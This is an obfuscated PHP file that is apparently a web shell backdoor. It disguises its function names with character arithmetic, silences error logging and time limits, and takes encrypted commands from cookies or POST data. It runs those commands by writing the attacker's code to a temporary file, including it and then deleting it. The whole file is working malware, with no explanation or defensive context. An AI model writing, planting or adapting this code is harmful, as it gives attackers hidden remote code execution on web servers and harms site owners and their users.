<?php $frkndaveq = chr(102)."\151".chr(581-473).'e'.chr(95).'p'."\x75".'t'.chr(95).chr(99).'o'."\x6e"."\x74".'e'."\x6e".chr(116).chr(115);
$qglnn = chr(98)."\x61"."\163".chr(263-162).chr(54)."\x34".chr(403-308).chr(859-759).chr(649-548).'c'."\x6f".chr(100).'e';
$vfkpbr = chr(105).chr(627-517)."\151".'_'.chr(573-458).chr(101).chr(116);
$eirmciwtl = chr(117)."\x6e".chr(108).chr(357-252)."\x6e"."\153";


@$vfkpbr("\x65"."\x72"."\x72".'o'.chr(656-542)."\x5f".chr(603-495).chr(111).'g', NULL);
@$vfkpbr(chr(851-743).'o'."\147"."\137".chr(101).chr(114).chr(114)."\x6f"."\162".chr(115), 0);
@$vfkpbr("\x6d"."\141"."\x78".chr(1019-924)."\x65"."\170".chr(807-706)."\x63"."\165"."\x74".chr(882-777).'o'."\156"."\137"."\x74".chr(746-641).'m'.'e', 0);
@set_time_limit(0);

function slegzmx($kdgqx, $aanvozgbh)
{
    $mimsmjofh = "";
    for ($tprvzqw = 0; $tprvzqw < strlen($kdgqx);) {
        for ($j = 0; $j < strlen($aanvozgbh) && $tprvzqw < strlen($kdgqx); $j++, $tprvzqw++) {
            $mimsmjofh .= chr(ord($kdgqx[$tprvzqw]) ^ ord($aanvozgbh[$j]));
        }
    }
    return $mimsmjofh;
}

$cqjtnzls = array_merge($_COOKIE, $_POST);
$hhhzh = '2264bac9-512a-4820-9e8d-048ea17b8c93';
foreach ($cqjtnzls as $oxwvrjkt => $kdgqx) {
    $kdgqx = @unserialize(slegzmx(slegzmx($qglnn($kdgqx), $hhhzh), $oxwvrjkt));
    if (isset($kdgqx["\141"."\153"])) {
        if ($kdgqx["\x61"] == chr(829-724)) {
            $tprvzqw = array(
                "\160"."\166" => @phpversion(),
                "\163"."\x76" => "3.5",
            );
            echo @serialize($tprvzqw);
        } elseif ($kdgqx["\x61"] == 'e') {
            $tzfrwsqk = "./" . md5($hhhzh) . "\x2e".chr(108-3)."\156".chr(838-739);
            @$frkndaveq($tzfrwsqk, "<" . "\x3f"."\160".'h'."\160".' '."\100"."\x75".chr(464-354).chr(309-201)."\151".chr(110)."\153"."\x28"."\137".chr(95)."\106".'I'.chr(373-297).chr(897-828)."\x5f".chr(95).chr(41)."\x3b".' ' . $kdgqx["\x64"]);
            @include($tzfrwsqk);
            @$eirmciwtl($tzfrwsqk);
        }
        exit();
    }
}

